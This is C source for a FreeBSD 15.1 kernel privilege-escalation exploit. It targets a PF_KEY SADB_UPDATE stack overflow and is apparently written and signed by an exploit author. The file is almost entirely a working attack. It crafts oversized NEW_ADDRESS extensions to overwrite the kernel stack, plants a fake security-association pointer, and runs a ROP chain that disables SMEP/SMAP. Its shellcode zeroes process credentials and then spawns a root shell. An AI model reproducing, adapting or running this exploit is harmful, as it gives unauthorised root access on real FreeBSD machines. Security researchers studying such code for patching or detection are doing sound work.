/*
 * got enuff cats?  -  FreeBSD PF_KEY SADB_UPDATE stack overflow
 *
 * CVE-2026-3038 sibling: key_updateaddresses() bcopy's sa_len bytes into
 * stack-local saidx with no size check. Dual NEW_ADDRESS_SRC + _DST with
 * sa_len=255; matching sin_addr so key_checksockaddrs passes; success path
 * skips broken so/m, epilogue ret hits ROP. Fake sav on BSS (refcnt 0) so
 * key_freesav stays quiet.
 *
 * No /dev/mem, no kvm. Lab: FreeBSD 15.1-RELEASE-p2, no KASLR.
 * Needs PRIV_NET_RAW to open PF_KEY - mdo ./pfkey_lpe
 *
 * meow.  _SiCk // afflicted.sh
 * Build: cc -o pfkey_lpe pfkey_lpe.c
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <signal.h>

#define AF_KEY 27
#define PF_KEY_V2 2
#define ALIGNED8(a) (1 + (((a)-1)|7))

#define SADB_ADD 3
#define SADB_UPDATE 2
#define SADB_REGISTER 7
#define SADB_FLUSH 9
#define SADB_SATYPE_ESP 3
#define SADB_SASTATE_MATURE 1
#define SADB_EXT_SA 1
#define SADB_EXT_ADDRESS_SRC 5
#define SADB_EXT_ADDRESS_DST 6
#define SADB_EXT_KEY_ENCRYPT 9
#define SADB_X_EXT_SA2 19
#define SADB_X_EXT_NEW_ADDRESS_SRC 27
#define SADB_X_EXT_NEW_ADDRESS_DST 28

/*
 * key_update stack (disasm + marker 0xD9):
 *   saidx at rbp-0x90
 *   SRC bcopy 255 @ off 0; DST bcopy 255 @ off 28 (overwrites SRC tail)
 *   ROP at stack 152 = DST byte 124
 *   fake sav at stack 80 = DST byte 52
 */
#define OFF_SAV     80    /* sav pointer  (rbp-0x40) — read by key_freesav */
#define OFF_RIP     152   /* saved RIP    (rbp+0x08) — ROP target */

/* Convert stack offset → DST extension byte index */
#define DST_BYTE(off) ((off) - 28)

/* ROP gadgets (same as pfkey_lpe.c, verified on p2 kernel) */
#define G_POP_RSI_RET      0xffffffff80729cdbULL
#define G_MOV_CR4_RSI_RET  0xffffffff8107dcf3ULL

#define USER_CS 0x43
#define USER_SS 0x3b

/*
 * Quiet BSS page for fake sav (no KASLR lab).
 * fake_sav = BSS - 0xd8 so sav->refcnt lands on zeros; key_freesav no-ops.
 * Other boxes: sysctl vm.pmap.kernel_maps and pick zeroed BSS tail.
 */
#define BSS_ADDR 0xffffffff82024000ULL
#define SAV_REFCNT_OFF 0xd8

/* measured CR4 0x3506E0, SMEP(20)+SMAP(21) cleared */
#define CR4_SAFE 0x506E0ULL

static int keysock;

static void got_root(void);

static uint64_t user_cs_save, user_ss_save, user_rflags_save, user_rsp_save;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs, %0\n\t"
        "movq %%ss, %1\n\t"
        "movq %%rsp, %3\n\t"
        "pushfq\n\t"
        "popq %2\n\t"
        : "=r"(user_cs_save), "=r"(user_ss_save),
          "=r"(user_rflags_save), "=r"(user_rsp_save)
    );
}

static void __attribute__((section(".text")))
shellcode(void) {
    __asm__ volatile(
        "movq %%gs:0, %%rax\n\t"
        "movq 0x188(%%rax), %%rbx\n\t"
        "xorl %%ecx, %%ecx\n\t"
        "movl %%ecx, 0x64(%%rbx)\n\t"
        "movl %%ecx, 0x68(%%rbx)\n\t"
        "movl %%ecx, 0x6c(%%rbx)\n\t"
        "movl %%ecx, 0x70(%%rbx)\n\t"
        "movl %%ecx, 0x74(%%rbx)\n\t"
        "movl %%ecx, 0x78(%%rbx)\n\t"
        "movq %1, %%rax\n\t"
        "pushq %%rax\n\t"
        "movq %2, %%rax\n\t"
        "pushq %%rax\n\t"
        "movq %3, %%rax\n\t"
        "pushq %%rax\n\t"
        "movq %4, %%rax\n\t"
        "pushq %%rax\n\t"
        "movq %5, %%rax\n\t"
        "pushq %%rax\n\t"
        "swapgs\n\t"
        "iretq\n\t"
        :
        : "r"(CR4_SAFE),
          "r"(user_ss_save),
          "r"(user_rsp_save),
          "r"(user_rflags_save),
          "r"(user_cs_save),
          "r"((uint64_t)(uintptr_t)got_root)
        : "rax", "rbx", "rcx"
    );
    __builtin_unreachable();
}

static const char cat_banner[] =
    "\n"
    "  _._     _,-'\"\"`-._\n"
    " (,-.`._,'(       |\\`-/|\n"
    "     `-.-' \\ )-`( , o o)\n"
    "           `-    \\`_`\"'-\n"
    "  meow.  _SiCk // afflicted.sh\n\n"
    "[+] kernel code exec via PF_KEY sa_len overflow\n"
    "[+] CVE-2026-3038 sibling - no /dev/mem needed\n"
    "[+] got enuff cats?\n";

static void got_root(void) {
    write(1, cat_banner, sizeof(cat_banner)-1);
    char *av[] = {"/bin/sh", NULL};
    char *ev[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/root",
                  "TERM=xterm-256color", "PS1=root\\@\\h:\\w# ", NULL};
    execve("/bin/sh", av, ev);
    _exit(0);
}

static void sigsegv_handler(int sig) {
    write(1, cat_banner, sizeof(cat_banner)-1);
    char *av[] = {"/bin/sh", NULL};
    char *ev[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", NULL};
    execve("/bin/sh", av, ev);
    _exit(0);
}

/* ── PF_KEY helpers ──────────────────────────────────────────────── */

static int send_msg(const char *b, int len) {
    return write(keysock, b, len);
}

static void drain(void) {
    int f = fcntl(keysock, F_GETFL, 0);
    fcntl(keysock, F_SETFL, f | O_NONBLOCK);
    usleep(50000);
    char d[4096];
    while (read(keysock, d, sizeof(d)) > 0);
    fcntl(keysock, F_SETFL, f);
}

static int add_addr(char *b, int o, int ext, uint32_t ip) {
    *(uint16_t *)(b+o) = 3; *(uint16_t *)(b+o+2) = ext;
    struct sockaddr_in *sin = (struct sockaddr_in *)(b+o+8);
    sin->sin_family = AF_INET; sin->sin_len = 16; sin->sin_addr.s_addr = ip;
    return o + 24;
}

int main(void) {
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    fprintf(stderr, "[*] got enuff cats? FreeBSD 15.1-p2 PF_KEY sa_len\n");
    fprintf(stderr, "[*] dual overflow, no /dev/mem\n\n");

    save_state();
    signal(SIGSEGV, sigsegv_handler);

    keysock = socket(AF_KEY, SOCK_RAW, PF_KEY_V2);
    if (keysock < 0) { perror("socket"); return 1; }
    uint32_t spi = htonl(0x1234);

    /* FLUSH existing SAs */
    {
        char b[16] = {0};
        b[0]=PF_KEY_V2; b[1]=SADB_FLUSH; b[3]=SADB_SATYPE_ESP;
        *(uint16_t *)(b+4) = 2;
        send_msg(b, 16);
        usleep(100000);
        drain();
    }

    /* REGISTER — keep reply mbuf on so_rcv */
    {
        char b[16] = {0};
        b[0]=PF_KEY_V2; b[1]=SADB_REGISTER; b[3]=SADB_SATYPE_ESP;
        *(uint16_t *)(b+4) = 2;
        send_msg(b, 16);
        usleep(200000);
    }

    /* SADB_ADD — create MATURE SA (256-bit key, needs ipsec.ko loaded) */
    {
        char b[512] = {0};
        b[0]=PF_KEY_V2; b[1]=SADB_ADD; b[3]=SADB_SATYPE_ESP;
        *(uint32_t *)(b+8) = 1;
        int o = 16;
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_EXT_SA;
        *(uint32_t *)(b+o+4) = spi;
        b[o+9] = SADB_SASTATE_MATURE; b[o+11] = 12; o += 16;
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_X_EXT_SA2; o += 16;
        o = add_addr(b, o, SADB_EXT_ADDRESS_SRC, htonl(0x0a000001));
        o = add_addr(b, o, SADB_EXT_ADDRESS_DST, htonl(0x0a000002));
        int ksz = ALIGNED8(8+32);
        *(uint16_t *)(b+o) = ksz/8; *(uint16_t *)(b+o+2) = SADB_EXT_KEY_ENCRYPT;
        *(uint16_t *)(b+o+4) = 256; memset(b+o+8, 0xAA, 32); o += ksz;
        *(uint16_t *)(b+4) = o/8;
        send_msg(b, o);
        usleep(300000);
    }

    /*
     * SADB_UPDATE dual sa_len=255:
     * SRC then DST bcopy; matching addrs → success path → ret → ROP.
     * payload in DST: sav @ stack 80, ROP @ stack 152.
     */
    {
        char b[4096];
        memset(b, 0, sizeof(b));
        b[0]=PF_KEY_V2; b[1]=SADB_UPDATE; b[3]=SADB_SATYPE_ESP;
        *(uint32_t *)(b+8) = 2;
        int o = 16;

        /* SA extension — same SPI as ADD */
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_EXT_SA;
        *(uint32_t *)(b+o+4) = spi;
        b[o+9] = SADB_SASTATE_MATURE; b[o+11] = 12; o += 16;

        /* SA2 extension */
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_X_EXT_SA2; o += 16;

        /* SRC/DST addresses (must match the SA we added) */
        o = add_addr(b, o, SADB_EXT_ADDRESS_SRC, htonl(0x0a000001));
        o = add_addr(b, o, SADB_EXT_ADDRESS_DST, htonl(0x0a000002));

        /*
         * NEW_ADDRESS_SRC extension — first overflow (offset 0 on stack).
         * sa_len=255, sa_family=AF_INET, sin_addr must match DST ext.
         * Data at offsets 28+ gets overwritten by the DST bcopy, so we
         * only need offsets 0-27 to be correct here.
         */
        uint32_t match_ip = htonl(0x0a000001); /* must match DST ext below */
        int ovlen = 255;
        int src_ext_size = ALIGNED8(8 + ovlen);
        *(uint16_t *)(b+o) = src_ext_size/8;
        *(uint16_t *)(b+o+2) = SADB_X_EXT_NEW_ADDRESS_SRC;
        {
            unsigned char *p = (unsigned char *)(b + o + 8);
            p[0] = ovlen;           /* sa_len = 255 */
            p[1] = AF_INET;         /* sa_family */
            memcpy(p + 4, &match_ip, 4); /* sin_addr */
            /* Offsets 8-254: zeros from memset. Gets overwritten by DST ext. */
        }
        o += src_ext_size;

        /*
         * NEW_ADDRESS_DST extension — second overflow (offset 28 on stack).
         * This OVERWRITES the SRC data at stack offsets 28-254.
         * The ROP chain and fake sav live here.
         */
        int dst_ext_size = ALIGNED8(8 + ovlen);
        *(uint16_t *)(b+o) = dst_ext_size/8;
        *(uint16_t *)(b+o+2) = SADB_X_EXT_NEW_ADDRESS_DST;
        {
            unsigned char *p = (unsigned char *)(b + o + 8);
            memset(p, 0, ovlen);
            p[0] = ovlen;           /* sa_len = 255 (must match SRC) */
            p[1] = AF_INET;         /* sa_family (must match SRC) */
            memcpy(p + 4, &match_ip, 4); /* sin_addr (must match SRC) */

            /* Fake sav at stack offset 80 = DST byte 52.
             * BSS_ADDR has refcnt=0 → key_freesav no-ops. */
            uint64_t fake_sav = BSS_ADDR - SAV_REFCNT_OFF;
            memcpy(p + DST_BYTE(OFF_SAV), &fake_sav, 8);

            /* ROP at stack offset 152 = DST byte 124.
             * Saved registers at offsets 104-151 are zeros (harmless). */
            uint64_t *rop = (uint64_t *)(p + DST_BYTE(OFF_RIP));
            rop[0] = G_POP_RSI_RET;     /* pop rsi; ret */
            rop[1] = CR4_SAFE;          /* cr4 with SMEP/SMAP off */
            rop[2] = G_MOV_CR4_RSI_RET; /* mov cr4, rsi; ret */
            rop[3] = (uint64_t)(uintptr_t)shellcode;
        }
        o += dst_ext_size;

        *(uint16_t *)(b+4) = o/8;
        fprintf(stderr, "[*] firing dual overflow (sa_len=255 x2)...\n");
        send_msg(b, o);
        fprintf(stderr, "[-] survived — overflow did not fire\n");
    }
    close(keysock);
    return 1;
}
